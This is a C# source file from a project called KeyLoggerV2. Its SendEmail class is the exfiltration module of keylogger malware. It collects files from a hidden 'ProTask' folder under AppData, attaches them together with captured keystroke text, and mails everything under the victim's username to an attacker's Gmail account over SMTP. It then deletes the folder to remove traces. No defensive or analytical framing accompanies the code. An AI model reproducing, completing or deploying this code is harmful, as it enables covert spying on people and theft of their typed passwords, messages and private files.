using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace KeyLoggerV2
{
    class SendEmail
    {
        public void Send(object obj, EventArgs e, string textBody)
        {
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string pictureDirectory = destination + '\\' + "ProTask";
            string[] filePaths = new string[]{};

            try
            {
                if (Directory.Exists(pictureDirectory))
                {
                    filePaths = Directory.GetFiles(pictureDirectory);
                }
            }
            catch
            {
                
            }

            try
            {
                SmtpClient client = new SmtpClient();
                MailMessage msg = new MailMessage();

                string email = Properties.Settings.Default.email;
                string pass = Properties.Settings.Default.pass;

                msg.To.Add(email);
                msg.From = new MailAddress(email, "Code Excutable", Encoding.UTF8);
                msg.Subject = Environment.UserName;
                msg.SubjectEncoding = Encoding.UTF8;
                msg.Body = textBody;
                msg.BodyEncoding = Encoding.UTF8;
                msg.IsBodyHtml = true;
                msg.Priority = MailPriority.High;

                client.Credentials = new NetworkCredential(email, pass);
                client.Port = 587;
                client.Host = "smtp.gmail.com";
                client.EnableSsl = true;

                foreach (var file in filePaths)
                {
                    var attach = new Attachment(file);
                    msg.Attachments.Add(attach);
                }

                client.Send(msg);

                client.Dispose();
                msg.Dispose();

                string folderToDelete = destination + '\\' + "ProTask";

                try
                {
                    Directory.Delete(folderToDelete, true);
                }
                catch (Exception)
                {
                    
                    throw;
                }
            }
            catch (Exception)
            {
                
                throw;
            }
        }
    }
}
